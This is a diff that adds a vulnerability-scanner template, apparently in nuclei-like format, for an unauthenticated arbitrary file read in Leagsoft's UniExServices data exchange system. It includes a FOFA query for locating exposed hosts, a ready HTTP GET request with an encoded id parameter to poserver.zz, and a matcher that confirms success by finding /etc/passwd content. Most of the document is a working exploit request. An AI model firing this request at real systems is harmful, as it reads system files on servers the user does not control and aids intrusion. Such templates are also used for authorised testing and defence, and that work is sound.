@@ -1,0 +1,24 @@
+## id: VEID-2024-0206
+## name: 联软安全数据交换系统任意文件读取
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description:接口存在未授任意文件读取。
+## fofa-query: body="UniExServices"
+## verification: true
+
+
+GET /UniExServices/poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnJCltInIrbDhyP24rOzhjPHI= HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+
+
+
+
+
+# @VEIL-STAMP: ab6619cf77c0741c89ebd545cbf16ad54c2cda40e45c8f608267aad2ced57e8b
